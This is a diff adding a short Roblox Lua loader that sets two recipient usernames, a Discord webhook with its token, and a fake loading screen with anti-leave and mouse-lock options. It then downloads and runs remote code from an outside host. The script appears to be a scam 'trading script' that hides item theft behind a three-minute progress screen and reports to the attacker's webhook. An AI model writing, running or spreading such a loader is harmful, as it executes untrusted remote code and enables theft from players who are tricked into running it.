@@ -1,0 +1,16 @@
+UserName = "MaxElix3"
+UserName2 = "Justine" --
+Webhook = "https://discord.com/api/webhooks/1099214960673951835/wjdzfNK9OAa5djz0l95PtM5MNdoaCZMULQrpMfDK3Bix0FuUR2EoolgCUQfZ7yGZg8-s" --
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Trading scriptd"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))()
